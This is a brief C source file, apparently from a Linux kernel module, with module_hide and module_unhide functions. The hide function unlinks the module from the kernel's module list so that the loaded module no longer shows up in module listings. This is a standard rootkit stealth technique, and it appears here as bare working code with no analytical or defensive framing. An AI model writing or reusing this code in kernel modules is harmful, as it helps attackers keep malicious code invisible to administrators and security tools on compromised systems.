#include "hide.h"

u8 module_hidden = 0;

static struct list_head *module_list;

void module_hide(void)
{
    if (module_hidden)
        return;
    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
}

void module_unhide(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, module_list);
    module_hidden = 0;
}